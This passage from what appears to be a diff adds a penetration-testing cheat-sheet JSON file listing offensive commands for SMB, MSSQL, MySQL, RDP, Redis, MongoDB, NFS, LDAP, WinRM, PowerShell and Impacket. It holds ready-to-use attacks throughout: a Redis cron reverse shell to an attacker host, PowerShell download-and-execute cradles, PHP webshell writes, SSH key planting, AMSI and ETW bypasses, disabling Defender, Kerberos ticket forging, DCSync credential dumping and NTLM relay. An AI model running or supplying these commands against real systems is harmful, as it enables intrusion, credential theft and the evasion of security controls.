+          { "title": "SMBMap Enumerate Shares", "desc": "Enumerate shares and permissions", "cmd": "smbmap -H <TARGET_IP> -u <USER> -p '<PASS>'", "tags": ["essential","tool"] },
+          { "title": "SMBMap Recursive Listing", "desc": "List all files on all shares", "cmd": "smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' -R", "tags": ["tool"] },
+          { "title": "SMBMap Execute Command", "desc": "Execute command via SMBMap", "cmd": "smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' -x 'ipconfig'", "tags": ["tool"] },
+          { "title": "Mount SMB Share (Linux)", "desc": "Mount SMB share to local directory", "cmd": "sudo mount -t cifs //<TARGET_IP>/<SHARE> /mnt/share -o username=<USER>,password=<PASS>", "tags": ["essential"] },
+          { "title": "EternalBlue (MS17-010)", "desc": "Exploit EternalBlue SMB vulnerability", "cmd": "python3 zzz_exploit.py <TARGET_IP>", "tags": ["advanced"], "note": "Use Metasploit module exploit/windows/smb/ms17_010_eternalblue for reliability" }
+        ]
+      },
+      {
+        "name": "MSSQL (1433)",
+        "commands": [
+          { "title": "Impacket MSSQL Connect", "desc": "Connect to MSSQL with impacket", "cmd": "mssqlclient.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> -windows-auth", "tags": ["essential","tool"] },
+          { "title": "MSSQL SA Login", "desc": "Connect as SA user", "cmd": "mssqlclient.py sa:<PASS>@<TARGET_IP>", "tags": ["essential"] },
+          { "title": "MSSQL Enable xp_cmdshell", "desc": "Enable xp_cmdshell for OS command execution", "cmds": ["EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", "EXEC xp_cmdshell 'whoami';"], "tags": ["essential"] },
+          { "title": "MSSQL List Databases", "desc": "List all databases", "cmd": "SELECT name FROM master.dbo.sysdatabases;", "tags": ["essential"] },
+          { "title": "MSSQL List Users", "desc": "List database users and roles", "cmd": "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G');", "tags": ["essential"] },
+          { "title": "MSSQL Steal Hash (Responder)", "desc": "Force NTLM auth to capture hash", "cmd": "EXEC xp_dirtree '\\\\<ATTACKER_IP>\\share';", "tags": ["advanced"] },
+          { "title": "MSSQL Write File", "desc": "Write file via OLE Automation", "cmds": ["EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", "DECLARE @obj INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @obj OUTPUT; EXEC sp_OAMethod @obj, 'CreateTextFile', NULL, 'C:\\Temp\\test.txt', 1;"], "tags": ["advanced"] },
+          { "title": "Sqsh MSSQL Connect", "desc": "Connect to MSSQL with sqsh", "cmd": "sqsh -S <TARGET_IP> -U <USER> -P '<PASS>' -D <DATABASE>", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "MySQL (3306)",
+        "commands": [
+          { "title": "MySQL Connect Local", "desc": "Connect to MySQL locally", "cmd": "mysql -u <USER> -p'<PASS>' -h <TARGET_IP>", "tags": ["essential"] },
+          { "title": "MySQL Show Databases", "desc": "List all databases", "cmd": "SHOW DATABASES;", "tags": ["essential"] },
+          { "title": "MySQL Show Tables", "desc": "List tables in current database", "cmd": "USE <DATABASE>; SHOW TABLES;", "tags": ["essential"] },
+          { "title": "MySQL Dump All Databases", "desc": "Dump all databases", "cmd": "mysqldump -u <USER> -p'<PASS>' -h <TARGET_IP> --all-databases > dump.sql", "tags": ["essential"] },
+          { "title": "MySQL Read File", "desc": "Read local file via MySQL", "cmd": "SELECT LOAD_FILE('/etc/passwd');", "tags": ["advanced"] },
+          { "title": "MySQL Write File (INTO OUTFILE)", "desc": "Write webshell via MySQL", "cmd": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';", "tags": ["advanced"] },
+          { "title": "MySQL User Hashes", "desc": "Dump MySQL user hashes", "cmd": "SELECT user, authentication_string FROM mysql.user;", "tags": ["essential"] },
+          { "title": "Hydra MySQL Brute", "desc": "Brute force MySQL credentials", "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "RDP (3389)",
+        "commands": [
+          { "title": "RDP Connect (xfreerdp)", "desc": "Connect to RDP with xfreerdp", "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP>", "tags": ["essential"] },
+          { "title": "RDP with Domain", "desc": "Connect to RDP with domain credentials", "cmd": "xfreerdp /u:<USER> /d:<DOMAIN> /p:'<PASS>' /v:<TARGET_IP>", "tags": ["essential"] },
+          { "title": "RDP Pass-the-Hash", "desc": "Connect to RDP using NTLM hash (Restricted Admin required)", "cmd": "xfreerdp /u:<USER> /d:<DOMAIN> /pth:<NTLM_HASH> /v:<TARGET_IP> /cert-ignore", "tags": ["advanced"] },
+          { "title": "RDP Drive Mount", "desc": "Mount local drive in RDP session", "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> /drive:share,/tmp", "tags": ["tool"] },
+          { "title": "RDP Ignore Cert", "desc": "Ignore certificate warnings", "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> /cert-ignore", "tags": ["essential"] },
+          { "title": "NLA Bypass Check", "desc": "Connect without NLA for older systems", "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> -sec-nla", "tags": ["tool"] },
+          { "title": "Hydra RDP Brute", "desc": "Brute force RDP credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>", "tags": ["tool"] },
+          { "title": "RDesktop Connect", "desc": "Connect via rdesktop", "cmd": "rdesktop -u <USER> -p '<PASS>' <TARGET_IP>", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "VNC (5900)",
+        "commands": [
+          { "title": "VNC Connect", "desc": "Connect to VNC server", "cmd": "vncviewer <TARGET_IP>:<PORT>", "tags": ["essential"] },
+          { "title": "Hydra VNC Brute", "desc": "Brute force VNC password", "cmd": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP>", "tags": ["tool"] },
+          { "title": "Nmap VNC Auth Check", "desc": "Check VNC authentication type", "cmd": "nmap -sV --script vnc-info,vnc-brute <TARGET_IP>", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "Redis (6379)",
+        "commands": [
+          { "title": "Redis Connect (No Auth)", "desc": "Connect to unauthenticated Redis", "cmd": "redis-cli -h <TARGET_IP>", "tags": ["essential"] },
+          { "title": "Redis Auth", "desc": "Authenticate to Redis", "cmd": "redis-cli -h <TARGET_IP> -a '<PASS>'", "tags": ["essential"] },
+          { "title": "Redis Info", "desc": "Get Redis server information", "cmd": "redis-cli -h <TARGET_IP> INFO", "tags": ["essential"] },
+          { "title": "Redis List Keys", "desc": "List all keys in database", "cmd": "redis-cli -h <TARGET_IP> KEYS '*'", "tags": ["essential"] },
+          { "title": "Redis Get All Values", "desc": "Dump all key-value pairs", "cmd": "redis-cli -h <TARGET_IP> --scan | xargs redis-cli -h <TARGET_IP> MGET", "tags": ["essential"] },
+          { "title": "Redis Write SSH Key", "desc": "Write SSH authorized_keys via Redis", "cmds": ["redis-cli -h <TARGET_IP> CONFIG SET dir /root/.ssh", "redis-cli -h <TARGET_IP> CONFIG SET dbfilename authorized_keys", "redis-cli -h <TARGET_IP> SET pwn '\\n\\n<SSH_PUBLIC_KEY>\\n\\n'", "redis-cli -h <TARGET_IP> BGSAVE"], "tags": ["advanced"] },
+          { "title": "Redis Write Webshell", "desc": "Write PHP webshell via Redis", "cmds": ["redis-cli -h <TARGET_IP> CONFIG SET dir /var/www/html", "redis-cli -h <TARGET_IP> CONFIG SET dbfilename shell.php", "redis-cli -h <TARGET_IP> SET shell '<?php system($_GET[\"cmd\"]); ?>'", "redis-cli -h <TARGET_IP> BGSAVE"], "tags": ["advanced"] },
+          { "title": "Redis Cron Job RCE", "desc": "Write cron job for reverse shell via Redis", "cmds": ["redis-cli -h <TARGET_IP> CONFIG SET dir /var/spool/cron/crontabs", "redis-cli -h <TARGET_IP> CONFIG SET dbfilename root", "redis-cli -h <TARGET_IP> SET shell '\\n\\n* * * * * /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\\n\\n'", "redis-cli -h <TARGET_IP> BGSAVE"], "tags": ["advanced"] }
+        ]
+      },
+      {
+        "name": "MongoDB (27017)",
+        "commands": [
+          { "title": "MongoDB Connect (No Auth)", "desc": "Connect to unauthenticated MongoDB", "cmd": "mongo <TARGET_IP>", "tags": ["essential"] },
+          { "title": "MongoDB List Databases", "desc": "Show all databases", "cmd": "show dbs", "tags": ["essential"] },
+          { "title": "MongoDB List Collections", "desc": "Show collections in current DB", "cmd": "use <DATABASE>; show collections;", "tags": ["essential"] },
+          { "title": "MongoDB Dump All", "desc": "Dump all MongoDB data", "cmd": "mongodump --host <TARGET_IP> --out /tmp/mongodump", "tags": ["essential"] },
+          { "title": "MongoDB NoSQLi Auth Bypass", "desc": "Authentication bypass via NoSQL injection", "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'", "tags": ["advanced"] }
+        ]
+      },
+      {
+        "name": "NFS (2049)",
+        "commands": [
+          { "title": "Show NFS Exports", "desc": "List NFS exported directories", "cmd": "showmount -e <TARGET_IP>", "tags": ["essential"] },
+          { "title": "Mount NFS Share", "desc": "Mount NFS share locally", "cmd": "sudo mount -t nfs <TARGET_IP>:<EXPORT_PATH> /mnt/nfs", "tags": ["essential"] },
+          { "title": "Mount NFS v3", "desc": "Force NFS version 3", "cmd": "sudo mount -t nfs -o vers=3 <TARGET_IP>:<EXPORT_PATH> /mnt/nfs", "tags": ["tool"] },
+          { "title": "NFS no_root_squash Abuse", "desc": "Write SUID bash if no_root_squash is set", "cmds": ["sudo mount -t nfs <TARGET_IP>:<EXPORT_PATH> /mnt/nfs", "cp /bin/bash /mnt/nfs/bash", "sudo chmod +s /mnt/nfs/bash"], "tags": ["advanced"], "note": "Then on target: /tmp/bash -p" }
+        ]
+      },
+      {
+        "name": "LDAP (389/636)",
+        "commands": [
+          { "title": "LDAP Anonymous Bind", "desc": "Test anonymous LDAP bind", "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -b 'dc=<DC>,dc=<TLD>'", "tags": ["essential"] },
+          { "title": "LDAP Authenticated Bind", "desc": "Query LDAP with credentials", "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>'", "tags": ["essential"] },
+          { "title": "LDAP Dump All Users", "desc": "Enumerate all AD users", "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(objectClass=user)' sAMAccountName userPrincipalName memberOf", "tags": ["essential"] },
+          { "title": "LDAP Dump All Computers", "desc": "List all computer objects", "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(objectClass=computer)' name operatingSystem", "tags": ["essential"] },
+          { "title": "LDAP Dump Domain Admins", "desc": "Get Domain Admin group members", "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(memberOf=CN=Domain Admins,CN=Users,DC=<DC>,DC=<TLD>)' sAMAccountName", "tags": ["essential"] },
+          { "title": "LDAP Password in Attributes", "desc": "Search for passwords in LDAP attributes", "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(description=*pass*)' sAMAccountName description", "tags": ["advanced"] },
+          { "title": "ldapdomaindump", "desc": "Comprehensive LDAP dump to HTML/JSON", "cmd": "ldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' <DC_IP> -o /tmp/ldap_dump", "tags": ["essential","tool"] }
+        ]
+      },
+      {
+        "name": "WinRM (5985/5986)",
+        "commands": [
+          { "title": "Evil-WinRM Connect", "desc": "Connect to WinRM with Evil-WinRM", "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'", "tags": ["essential","tool"] },
+          { "title": "Evil-WinRM with Hash", "desc": "Pass-the-hash via WinRM", "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>", "tags": ["essential"] },
+          { "title": "Evil-WinRM with SSL", "desc": "Connect to WinRM with SSL (5986)", "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -S", "tags": ["tool"] },
+          { "title": "Evil-WinRM File Upload", "desc": "Upload file to target", "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /path/to/scripts/ -e /path/to/executables/", "tags": ["tool"] },
+          { "title": "Evil-WinRM Run Script", "desc": "Load and run PowerShell script", "cmd": "Invoke-Binary /path/to/script.ps1", "tags": ["tool"], "note": "Run inside evil-winrm session" }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "powershell-pentest",
+    "name": "PowerShell for Pentesters",
+    "icon": "⚡",
+    "description": "PowerShell commands for Active Directory enumeration, exploitation, and post-exploitation using PowerView, PowerUp, and native cmdlets.",
+    "subcategories": [
+      {
+        "name": "PowerShell Basics & Execution",
+        "commands": [
+          { "title": "Bypass ExecutionPolicy", "desc": "Bypass PowerShell execution policy", "cmd": "powershell -ep bypass", "tags": ["essential"] },
+          { "title": "PowerShell Download Cradle", "desc": "Download and execute script in memory", "cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/<SCRIPT>.ps1')\"", "tags": ["essential"] },
+          { "title": "PowerShell EncodedCommand", "desc": "Execute base64 encoded command", "cmd": "powershell -ep bypass -enc <BASE64_CMD>", "tags": ["essential"] },
+          { "title": "Encode PS Command (Linux)", "desc": "Encode PowerShell command to base64", "cmd": "echo -n \"<PS_COMMAND>\" | iconv -t UTF-16LE | base64 -w 0", "tags": ["essential"] },
+          { "title": "PowerShell Invoke-Expression", "desc": "Execute string as command", "cmd": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')", "tags": ["essential"] },
+          { "title": "PowerShell Download File", "desc": "Download file to disk", "cmd": "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>/file.exe' -OutFile 'C:\\Temp\\file.exe'", "tags": ["essential"] },
+          { "title": "PowerShell Check Language Mode", "desc": "Check if in constrained language mode", "cmd": "$ExecutionContext.SessionState.LanguageMode", "tags": ["tool"] },
+          { "title": "PowerShell Version", "desc": "Check PowerShell version", "cmd": "$PSVersionTable.PSVersion", "tags": ["tool"] },
+          { "title": "Disable AMSI (Reflection)", "desc": "Disable AMSI via reflection", "cmd": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", "tags": ["advanced"] }
+        ]
+      },
+      {
+        "name": "PowerView — AD Enumeration",
+        "commands": [
+          { "title": "Import PowerView", "desc": "Load PowerView into memory", "cmd": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView.ps1')", "tags": ["essential","tool"] },
+          { "title": "Get Domain Info", "desc": "Get domain information", "cmd": "Get-Domain", "tags": ["essential"] },
+          { "title": "Get Domain Controller", "desc": "List domain controllers", "cmd": "Get-DomainController", "tags": ["essential"] },
+          { "title": "Get All Domain Users", "desc": "Enumerate all domain users", "cmd": "Get-DomainUser | select samaccountname,description,memberof", "tags": ["essential"] },
+          { "title": "Get User Description", "desc": "Find passwords in user descriptions", "cmd": "Get-DomainUser | Where-Object {$_.description -ne $null} | select samaccountname,description", "tags": ["essential"] },
+          { "title": "Get Domain Groups", "desc": "List all domain groups", "cmd": "Get-DomainGroup | select name", "tags": ["essential"] },
+          { "title": "Get Domain Admin Members", "desc": "List Domain Admin group members", "cmd": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | select MemberName", "tags": ["essential"] },
+          { "title": "Get Domain Computers", "desc": "List all domain computers", "cmd": "Get-DomainComputer | select name,operatingsystem", "tags": ["essential"] },
+          { "title": "Find Local Admins", "desc": "Find local admin rights for current user", "cmd": "Find-LocalAdminAccess", "tags": ["essential"] },
+          { "title": "Get Logged On Users", "desc": "Get logged on users across domain", "cmd": "Get-NetLoggedon -ComputerName <COMPUTER>", "tags": ["tool"] },
+          { "title": "Get Domain Trusts", "desc": "Enumerate domain trusts", "cmd": "Get-DomainTrust", "tags": ["essential"] },
+          { "title": "Get Forest Trusts", "desc": "Enumerate forest trusts", "cmd": "Get-ForestTrust", "tags": ["tool"] },
+          { "title": "Find Interesting Files", "desc": "Search for sensitive files on shares", "cmd": "Find-InterestingDomainShareFile -Include *.txt,*.pdf,*.xls,*.doc,*.ps1,*.bat", "tags": ["advanced"] },
+          { "title": "Get SPNs (Kerberoast)", "desc": "Find all service principal names", "cmd": "Get-DomainUser -SPN | select samaccountname,serviceprincipalname", "tags": ["essential"] },
+          { "title": "Invoke-Kerberoast", "desc": "Kerberoast all SPNs and output hashes", "cmd": "Invoke-Kerberoast | fl", "tags": ["essential"] },
+          { "title": "Get ASREPRoast Targets", "desc": "Find accounts with pre-auth disabled", "cmd": "Get-DomainUser -PreauthNotRequired | select samaccountname", "tags": ["essential"] },
+          { "title": "Get ACL Rights", "desc": "Find ACL rights for a specific user", "cmd": "Get-DomainObjectAcl -Identity '<USER>' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|WriteProperty|WriteDacl'}", "tags": ["advanced"] },
+          { "title": "Find ObjectAcl Write Paths", "desc": "Find write/modify rights across all objects", "cmd": "Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match '<USER>'}", "tags": ["advanced"] },
+          { "title": "Unconstrained Delegation", "desc": "Find computers with unconstrained delegation", "cmd": "Get-DomainComputer -Unconstrained | select name", "tags": ["essential"] },
+          { "title": "Constrained Delegation", "desc": "Find accounts with constrained delegation", "cmd": "Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto", "tags": ["essential"] }
+        ]
+      },
+      {
+        "name": "PowerUp — Privilege Escalation",
+        "commands": [
+          { "title": "Import PowerUp", "desc": "Load PowerUp into memory", "cmd": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')", "tags": ["essential","tool"] },
+          { "title": "Invoke-AllChecks", "desc": "Run all PowerUp privilege escalation checks", "cmd": "Invoke-AllChecks", "tags": ["essential"] },
+          { "title": "Get-ServiceUnquoted", "desc": "Find services with unquoted paths", "cmd": "Get-ServiceUnquoted | select ServiceName,PathName", "tags": ["essential"] },
+          { "title": "Get-ModifiableService", "desc": "Find services current user can modify", "cmd": "Get-ModifiableService | select ServiceName", "tags": ["essential"] },
+          { "title": "Get-ModifiableServiceFile", "desc": "Find services with writable binaries", "cmd": "Get-ModifiableServiceFile | select ServiceName,ModifiablePath", "tags": ["essential"] },
+          { "title": "Invoke-ServiceAbuse", "desc": "Abuse modifiable service to add local admin", "cmd": "Invoke-ServiceAbuse -ServiceName '<SERVICE>' -UserName '<DOMAIN>\\<USER>'", "tags": ["advanced"] },
+          { "title": "Write-ServiceBinary", "desc": "Replace service binary with custom payload", "cmd": "Write-ServiceBinary -ServiceName '<SERVICE>' -Path C:\\Temp\\payload.exe", "tags": ["advanced"] },
+          { "title": "Get AlwaysInstallElevated", "desc": "Check AlwaysInstallElevated registry key", "cmd": "Get-RegistryAlwaysInstallElevated", "tags": ["essential"] },
+          { "title": "Get-UnattendedInstallFiles", "desc": "Find unattended installation files with creds", "cmd": "Get-UnattendedInstallFile", "tags": ["essential"] },
+          { "title": "Get-CachedGPPPassword", "desc": "Find cached GPP passwords", "cmd": "Get-CachedGPPPassword", "tags": ["essential"] }
+        ]
+      },
+      {
+        "name": "AMSI & Defense Bypass",
+        "commands": [
+          { "title": "AMSI Bypass - Matt Graeber", "desc": "Classic AMSI bypass via reflection", "cmd": "[System.Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null), 1)", "tags": ["advanced"] },
+          { "title": "AMSI Bypass - Patching", "desc": "Patch AMSI.dll in memory", "cmd": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)", "tags": ["advanced"] },
+          { "title": "Disable Windows Defender (Admin)", "desc": "Disable Defender real-time protection", "cmd": "Set-MpPreference -DisableRealtimeMonitoring $true", "tags": ["advanced"] },
+          { "title": "Add Defender Exclusion", "desc": "Add path to Defender exclusion list", "cmd": "Add-MpPreference -ExclusionPath 'C:\\Temp'", "tags": ["advanced"] },
+          { "title": "ETW Bypass", "desc": "Disable ETW logging for current PS process", "cmd": "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)", "tags": ["advanced"] }
+        ]
+      },
+      {
+        "name": "Active Directory Module (Native)",
+        "commands": [
+          { "title": "Import AD Module", "desc": "Import Active Directory PowerShell module", "cmd": "Import-Module ActiveDirectory", "tags": ["essential"] },
+          { "title": "Get-ADUser All", "desc": "List all AD users", "cmd": "Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description", "tags": ["essential"] },
+          { "title": "Get-ADGroup Members", "desc": "List members of a group", "cmd": "Get-ADGroupMember -Identity 'Domain Admins' -Recursive | select Name", "tags": ["essential"] },
+          { "title": "Get-ADComputer All", "desc": "List all domain computers", "cmd": "Get-ADComputer -Filter * -Properties * | select Name,OperatingSystem,IPv4Address", "tags": ["essential"] },
+          { "title": "Get-ADDomainController", "desc": "List domain controllers", "cmd": "Get-ADDomainController -Filter *", "tags": ["essential"] },
+          { "title": "Get-ADTrust", "desc": "List domain trusts", "cmd": "Get-ADTrust -Filter *", "tags": ["tool"] },
+          { "title": "Set-ADAccountPassword", "desc": "Reset user password (if rights allow)", "cmd": "Set-ADAccountPassword -Identity <USER> -Reset -NewPassword (ConvertTo-SecureString '<NEW_PASS>' -AsPlainText -Force)", "tags": ["advanced"] }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "impacket-suite",
+    "name": "Impacket Toolsuite",
+    "icon": "🐍",
+    "description": "Comprehensive Impacket tools for Windows/AD protocol attacks, credential dumping, and lateral movement.",
+    "subcategories": [
+      {
+        "name": "Remote Execution",
+        "commands": [
+          { "title": "PsExec Remote Shell", "desc": "Get SYSTEM shell via SMB", "cmd": "psexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["essential","tool"] },
+          { "title": "PsExec with Hash", "desc": "PsExec using NTLM hash", "cmd": "psexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>", "tags": ["essential"] },
+          { "title": "WMIExec Remote Shell", "desc": "Get shell via WMI (semi-interactive)", "cmd": "wmiexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["essential","tool"] },
+          { "title": "WMIExec with Hash", "desc": "WMIExec using NTLM hash", "cmd": "wmiexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>", "tags": ["essential"] },
+          { "title": "SMBExec Remote Shell", "desc": "Get SYSTEM shell via SMB service creation", "cmd": "smbexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["tool"] },
+          { "title": "AtExec Command", "desc": "Execute command via Task Scheduler", "cmd": "atexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP> 'whoami'", "tags": ["tool"] },
+          { "title": "DCOMExec Remote Shell", "desc": "Execute via DCOM (MMC20)", "cmd": "dcomexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["advanced"] }
+        ]
+      },
+      {
+        "name": "Kerberos Attacks",
+        "commands": [
+          { "title": "GetUserSPNs (Kerberoast)", "desc": "Get TGS tickets for Kerberoasting", "cmd": "GetUserSPNs.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request", "tags": ["essential","tool"] },
+          { "title": "GetUserSPNs with Hash", "desc": "Kerberoast using NTLM hash", "cmd": "GetUserSPNs.py -hashes :<NTLM_HASH> <DOMAIN>/<USER> -dc-ip <DC_IP> -request", "tags": ["tool"] },
+          { "title": "GetNPUsers (ASREPRoast)", "desc": "Get AS-REP hashes for roasting", "cmd": "GetNPUsers.py <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP> -format hashcat", "tags": ["essential","tool"] },
+          { "title": "GetNPUsers Single User", "desc": "AS-REP roast a specific user", "cmd": "GetNPUsers.py <DOMAIN>/<USER> -no-pass -dc-ip <DC_IP> -format hashcat", "tags": ["essential"] },
+          { "title": "getTGT Get Ticket", "desc": "Get TGT for a user", "cmd": "getTGT.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>", "tags": ["tool"] },
+          { "title": "getST S4U (Delegation)", "desc": "Get service ticket via S4U2Self/S4U2Proxy", "cmd": "getST.py -spn <SERVICE>/<TARGET> -impersonate administrator <DOMAIN>/<USER>:'<PASS>'", "tags": ["advanced"] },
+          { "title": "Ticketer Silver Ticket", "desc": "Forge silver ticket", "cmd": "ticketer.py -nthash <SERVICE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE>/<TARGET> administrator", "tags": ["advanced"] },
+          { "title": "Ticketer Golden Ticket", "desc": "Forge golden ticket with krbtgt hash", "cmd": "ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> administrator", "tags": ["advanced"] },
+          { "title": "Use Kerberos Ticket", "desc": "Export ticket for use with Impacket", "cmd": "export KRB5CCNAME=administrator.ccache", "tags": ["essential"] }
+        ]
+      },
+      {
+        "name": "Credential Dumping",
+        "commands": [
+          { "title": "SecretsDump Remote SAM", "desc": "Dump SAM and LSA secrets remotely", "cmd": "secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["essential","tool"] },
+          { "title": "SecretsDump with Hash", "desc": "Dump secrets using NTLM hash", "cmd": "secretsdump.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>", "tags": ["essential"] },
+          { "title": "SecretsDump DCSync", "desc": "DCSync to get all domain hashes", "cmd": "secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-ntlm", "tags": ["essential"] },
+          { "title": "SecretsDump Just NTLM", "desc": "Get only NTLM hashes from DC", "cmd": "secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-ntlm -outputfile hashes.txt", "tags": ["essential"] },
+          { "title": "SecretsDump from NTDS", "desc": "Dump from copied NTDS.dit file", "cmd": "secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL", "tags": ["advanced"] }
+        ]
+      },
+      {
+        "name": "Network Attacks",
+        "commands": [
+          { "title": "NTLM Relay Setup", "desc": "Relay NTLM auth to execute commands", "cmd": "ntlmrelayx.py -t smb://<TARGET_IP> -smb2support", "tags": ["essential","tool"] },
+          { "title": "NTLM Relay Interactive Shell", "desc": "Get interactive SMB shell via relay", "cmd": "ntlmrelayx.py -t smb://<TARGET_IP> -smb2support -i", "tags": ["tool"] },
+          { "title": "NTLM Relay Execute Command", "desc": "Execute command via relay", "cmd": "ntlmrelayx.py -t smb://<TARGET_IP> -smb2support -c 'whoami'", "tags": ["tool"] },
+          { "title": "NTLM Relay to LDAP (DA)", "desc": "Relay to LDAP to add user to DA", "cmd": "ntlmrelayx.py -t ldaps://<DC_IP> --delegate-access -smb2support", "tags": ["advanced"] },
+          { "title": "NTLM Relay MultiRelay", "desc": "Relay to multiple targets from list", "cmd": "ntlmrelayx.py -tf targets.txt -smb2support", "tags": ["tool"] },
+          { "title": "Responder Start", "desc": "Start Responder to capture NTLM hashes", "cmd": "sudo responder -I <INTERFACE> -wPv", "tags": ["essential","tool"] },
+          { "title": "Responder without SMB/HTTP", "desc": "Run Responder while ntlmrelayx is active", "cmd": "sudo responder -I <INTERFACE> -wd", "tags": ["essential"], "note": "Disable SMB and HTTP in /etc/responder/Responder.conf first" },
+          { "title": "Mitm6 IPv6 Poisoning", "desc": "IPv6 DNS takeover for NTLM capture", "cmd": "sudo mitm6 -d <DOMAIN>", "tags": ["advanced","tool"] }
+        ]
+      },
+      {
+        "name": "LDAP / AD Tools",
+        "commands": [
+          { "title": "FindDelegation", "desc": "Find delegation configurations", "cmd": "findDelegation.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>", "tags": ["essential","tool"] },
+          { "title": "GetADUsers", "desc": "Enumerate AD users", "cmd": "GetADUsers.py -all <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>", "tags": ["essential"] },
+          { "title": "Lookupsid RID Brute", "desc": "Enumerate users via SID/RID brute force", "cmd": "lookupsid.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["essential"] },
+          { "title": "Samrdump User Enum", "desc": "Enumerate users via SAMR protocol", "cmd": "samrdump.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["tool"] },
